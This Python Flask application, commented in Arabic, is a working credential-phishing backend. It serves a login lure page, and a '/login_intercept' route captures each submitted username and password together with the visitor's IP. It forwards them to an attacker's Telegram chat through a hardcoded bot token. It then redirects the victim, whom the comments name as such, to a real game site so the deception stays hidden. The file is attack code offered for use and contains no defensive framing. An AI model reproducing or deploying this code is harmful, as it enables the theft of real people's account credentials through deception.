# app.py - النسخة النهائية المصححة لخطأ IP و الجاهزة لـ Login Intercept
from flask import Flask, request, jsonify, render_template
import requests
import os
import sys

app = Flask(__name__)

#================================================
# اعدادات التلغرام - لغرض التنفيذ
#================================================
TELEGRAM_BOT_TOKEN = "8524364904:AAEB_SX7vIt2EhZikJbLOBgwHOmeQTYuHN8"
TELEGRAM_CHAT_ID = "6521966233" 
#================================================

def send_telegram_message(message, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': parse_mode
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except requests.exceptions.RequestException:
        pass 

# دالة للحصول على IP الحقيقي باستخدام X-Forwarded-For
def get_real_ip():
    # Render ترسل IP الحقيقي في هذا الهيدر
    return request.headers.get('X-Forwarded-For', request.remote_addr)

@app.route('/login_intercept', methods=['POST'])
def login_intercept():
    try:
        username = request.form.get('login_name', 'N/A')
        password = request.form.get('login_pass', 'N/A')
        # الآن نستخدم الدالة المصححة للحصول على IP الحقيقي
        ip_address = get_real_ip()
        
        # صياغة رسالة HTML متقنة لإبراز الرمز
        telegram_message = f"""
<b>⚔️ اعتراض تسجيل دخول جديد! ⚔️</b>

🕒 <b>الوقت:</b> <code>{os.environ.get('RENDER_INSTANCE_ID', 'N/A')}</code>
🌐 <b>IP الضحية:</b> <code>{ip_address}</code>

<pre>
<b>اسم المستخدم (Login):</b> {username}
<b>كلمة المرور (Pass):</b> {password}
</pre>
"""
        send_telegram_message(telegram_message, parse_mode='HTML')
        
        # إعادة توجيه الضحية إلى صفحة اللعبة الأصلية لإخفاء الخدعة
        return jsonify({"status": "success", "redirect": "https://sabaya.ae/"}), 200

    except Exception as e:
        error_message = f"🚨 خطأ داخلي في اعتراض البيانات: {str(e)}"
        send_telegram_message(error_message)
        return jsonify({"status": "internal_error"}), 500

@app.route('/')
def home():
    return render_template('login_lure.html')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
